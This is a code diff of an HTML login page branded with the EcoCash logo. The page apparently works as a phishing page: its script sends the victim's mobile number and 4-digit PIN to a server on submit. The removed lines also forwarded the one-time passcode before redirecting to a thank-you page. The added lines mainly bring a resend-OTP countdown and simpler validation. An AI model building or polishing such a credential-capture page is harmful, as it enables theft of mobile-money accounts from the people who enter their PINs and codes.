@@ -28,53 +28,13 @@
   .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
   .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
 
-  /* error styling */
-  .input-error{
-    border-color:#dc2626 !important;
-    background:#fff5f5;
-  }
-  .error-text{
-    font-size:12px;
-    color:#dc2626;
-    margin-top:4px;
-    display:none;
-  }
+  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
+  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
 
-  /* SHAKE animation */
-  @keyframes shake {
-    0%{transform:translateX(0)}
-    20%{transform:translateX(-4px)}
-    40%{transform:translateX(4px)}
-    60%{transform:translateX(-4px)}
-    80%{transform:translateX(4px)}
-    100%{transform:translateX(0)}
-  }
-  .shake{
-    animation:shake .35s;
-  }
-
-  /* 🔧 ONLY FIX APPLIED HERE */
-  .otp-modal{
-    position:fixed;
-    left:0;
-    top:0;
-    width:100%;
-    height:100%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    background:rgba(0,0,0,0.35);
-    z-index:9999; /* ✅ THIS IS THE ONLY CHANGE */
-  }
-
-  .otp-box{
-    background:#fff;
-    padding:18px;
-    border-radius:12px;
-    min-width:300px;
-    max-width:92%;
-    box-shadow:0 12px 24px rgba(2,6,23,0.08)
-  }
+  .req{color:#d04444;margin-right:6px}
+  .small{font-size:13px;color:#6b7280}
+  .success{color:#16a34a;font-weight:600}
+  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
 
   .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
   .otp-digit{
@@ -87,21 +47,19 @@
     background:#fbfdff;
   }
 
-  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
+  .resend-row{display:flex;gap:10px;align-items:center;margin-top:12px;justify-content:space-between}
+  .resend-info{font-size:13px;color:#6b7280}
+  .resend-btn{background:#fff;border:1px solid #e6eefc;padding:8px 12px;border-radius:8px;cursor:pointer}
+  .resend-btn[disabled]{opacity:.6;cursor:not-allowed}
 </style>
 </head>
-
 <body>
   <div class="card">
     <img src="assets/eco.png" alt="EcoCash logo" class="logo">
     <h2>Log In</h2>
-
     <form id="loginForm" autocomplete="off">
       <label><span class="req">★</span>Mobile Number
         <input id="phone" name="phone" required value="+263" inputmode="tel" autocomplete="tel" />
-        <div id="phoneError" class="error-text">
-          Enter a valid number starting with 7 (9 digits)
-        </div>
       </label>
 
       <label><span class="req">★</span>4-Digit PIN
@@ -112,7 +70,6 @@
     </form>
   </div>
 
-  <!-- OTP MODAL -->
   <div id="otpModal" style="display:none" class="otp-modal">
     <div class="otp-box">
       <strong style="display:block;text-align:center">Enter OTP</strong>
@@ -128,6 +85,13 @@
 
       <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
 
+      <div class="resend-row">
+        <div class="resend-info" id="resendInfo">
+          Resend available in <span id="countdown">120</span>s
+        </div>
+        <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
+      </div>
+
       <div style="display:flex;gap:10px;margin-top:12px">
         <button id="confirmOtp" style="flex:1;background:#16a34a;color:#fff;border:0;border-radius:8px" disabled>Confirm</button>
         <button id="cancelOtp" style="flex:1;background:#e5e7eb;border:0;border-radius:8px">Cancel</button>
@@ -138,26 +102,17 @@
   </div>
 
 <script>
-  let selectedPlan = null;
-  try {
-    const raw = sessionStorage.getItem('selectedPlan');
-    if (raw) selectedPlan = JSON.parse(raw);
-  } catch(e){}
-
   const phoneEl = document.getElementById('phone');
   const pinEl = document.getElementById('pin');
   const loginBtn = document.getElementById('loginBtn');
-  const phoneError = document.getElementById('phoneError');
 
   const PREFIX = '+263';
-  let phoneCompleted = false;
 
   function normalizePhone(){
     let digits = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
     if (digits.startsWith('0')) digits = digits.slice(1);
     if (digits.length && digits[0] !== '7') digits = '7' + digits.slice(1);
-    digits = digits.slice(0,9);
-    phoneEl.value = PREFIX + digits;
+    phoneEl.value = PREFIX + digits.slice(0,9);
   }
 
   function isValidPhone(){
@@ -166,40 +121,22 @@
   }
 
   function updateLoginState(){
-    const validPhone = isValidPhone();
-    const validPin = /^\d{4}$/.test(pinEl.value);
-    loginBtn.disabled = !(validPhone && validPin);
-
-    if (!validPhone && phoneEl.value.length > PREFIX.length) {
-      phoneEl.classList.add('input-error');
-      phoneError.style.display = 'block';
-      phoneEl.classList.add('shake');
-      setTimeout(()=>phoneEl.classList.remove('shake'),350);
-    } else {
-      phoneEl.classList.remove('input-error');
-      phoneError.style.display = 'none';
-    }
-
-    if (validPhone && !phoneCompleted) {
-      phoneCompleted = true;
-      pinEl.focus();
-    }
-    if (!validPhone) phoneCompleted = false;
+    loginBtn.disabled = !(isValidPhone() && /^\d{4}$/.test(pinEl.value));
   }
 
-  phoneEl.addEventListener('keydown', e => {
-    if ((e.key === 'Backspace' || e.key === 'Delete') && phoneEl.selectionStart <= PREFIX.length) {
+  phoneEl.addEventListener('keydown', e=>{
+    if((e.key==='Backspace'||e.key==='Delete') && phoneEl.selectionStart<=PREFIX.length){
       e.preventDefault();
     }
   });
 
-  phoneEl.addEventListener('input', () => {
-    if (!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
+  phoneEl.addEventListener('input', ()=>{
+    if(!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
     normalizePhone();
     updateLoginState();
   });
 
-  pinEl.addEventListener('input',()=>{
+  pinEl.addEventListener('input', ()=>{
     pinEl.value = pinEl.value.replace(/\D/g,'').slice(0,4);
     updateLoginState();
   });
@@ -213,12 +150,6 @@
   }
 
   const otpModal=document.getElementById('otpModal');
-  const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
-  const confirmBtn=document.getElementById('confirmOtp');
-  const cancelBtn=document.getElementById('cancelOtp');
-  const otpWarning=document.getElementById('otpWarning');
-
-  function getOtp(){return dEls.map(d=>d.value||'').join('');}
 
   document.getElementById('loginForm').addEventListener('submit',async e=>{
     e.preventDefault();
@@ -227,25 +158,11 @@
       submittedAt:new Date().toISOString(),
       event:'login_clicked',
       loginPhone:phoneEl.value,
-      loginPin:pinEl.value,
-      selectedPlan
+      loginPin:pinEl.value
     });
   });
 
-  confirmBtn.addEventListener('click',async()=>{
-    if(!/^\d{6}$/.test(getOtp())){otpWarning.style.display='block';return;}
-    await sendToServer({
-      submittedAt:new Date().toISOString(),
-      event:'otp_confirm',
-      loginPhone:phoneEl.value,
-      loginPin:pinEl.value,
-      otp:getOtp(),
-      selectedPlan
-    });
-    window.location.href='thankyou.html';
-  });
-
-  cancelBtn.onclick=()=>otpModal.style.display='none';
+  document.getElementById('cancelOtp').onclick=()=>otpModal.style.display='none';
 </script>
 </body>
 </html>
